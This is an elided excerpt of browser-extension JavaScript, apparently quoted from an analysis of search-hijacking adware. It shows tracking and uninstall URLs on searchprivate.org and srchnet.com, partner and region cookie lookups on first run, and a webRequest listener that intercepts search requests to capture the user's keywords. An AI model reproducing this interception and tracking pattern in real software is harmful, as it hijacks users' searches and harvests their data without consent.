...
TILIB.prototype.UninstallUrl="http://searchprivate.org/rd2/index.php?id=202999bmluc3RhbGwtcGFnZS8&guid={guid}";
TILIB.prototype.DownloadUrl="";
TILIB.prototype.SearchEngineUrl="http://srchnet.com/search/";
...
TILIB.prototype.startup=function()
{
	...
	if(firstRun)
	{
		...
		{
			var country="";
			var domain=this.getCookie(this.DomainCookieName,"searchprivate.org");
			var group=this.getCookie(this.PartnerCookieName,"convertor");
			var paramKeyCookie="";
			country=this.getCookie(this.RegionCookieName,"");
			domain=this.getCookie(this.DomainCookieName,"searchprivate.org");
			group=this.getCookie(this.PartnerCookieName,"convertor");
...
chrome.runtime.onMessage.addListener(function(req, sender, sendResponse)
{
    ...
    case "checkFirstRun":
      ...
      {
        res.isFirstRun=TILIBInstance.getSetting("FirstRunPopUp", true);
        TILIBInstance.setSetting("FirstRunPopUp",false);
        sendResponse(res);
      }
      else
      {
        res.isFirstRun = false;
        sendResponse(res);
      }
      break;
...
chrome.webRequest.onBeforeRequest.addListener(function(details)
{
	...
	if(url.indexOf(TILIBInstance.SearchEngineUrl)!=-1)
	{
		...
		var keyword=(keys[keys.length-1]);
